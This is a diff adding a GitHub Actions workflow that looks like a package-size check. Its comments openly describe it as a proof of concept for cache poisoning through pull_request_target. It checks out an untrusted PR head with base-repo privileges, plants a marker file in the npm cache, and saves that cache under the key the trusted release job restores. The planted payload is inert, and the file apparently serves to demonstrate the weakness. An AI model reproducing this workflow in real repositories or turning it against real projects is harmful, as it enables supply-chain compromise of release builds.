@@ -1,0 +1,44 @@
+name: pr-size-check
+
+# Looks ordinary: reports the package size on every pull request. But it runs on
+# pull_request_target, so it executes with the BASE repo's context and write
+# access to the main cache scope, while checking out the untrusted PR head. That
+# is the cache-poisoning vector (TanStack, 11 May 2026; Ultralytics, Dec 2024):
+# it saves a cache under the exact key the trusted release job will restore once
+# this PR's lockfile is on main.
+on:
+  pull_request_target:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  size-check:
+    runs-on: craci
+    steps:
+      - uses: cracicorp/setup@v1
+        with:
+          size: "2"
+          image: "default"
+      # Untrusted PR head, checked out with base-repo privileges.
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - name: Report package size
+        run: echo "package.json is $(wc -c < package.json) bytes"
+      # Populate ~/.npm for this PR's lockfile, then plant one inert marker file.
+      # Nothing in the cache executes; the marker is plain text.
+      - run: npm ci
+      - name: Plant an inert marker in the npm cache
+        run: |
+          echo "planted by pr-size-check (pull_request_target) PR #${{ github.event.pull_request.number }} run ${{ github.run_id }} sha ${{ github.event.pull_request.head.sha }}" > ~/.npm/PARALLAX_CACHE_MARKER.txt
+      # Save under the key the release job asks for after this PR's lockfile lands.
+      # pull_request_target scopes this cache to refs/heads/main, so main restores it.
+      - uses: actions/cache/save@v4
+        with:
+          path: ~/.npm
+          key: npm-${{ hashFiles('**/package-lock.json') }}
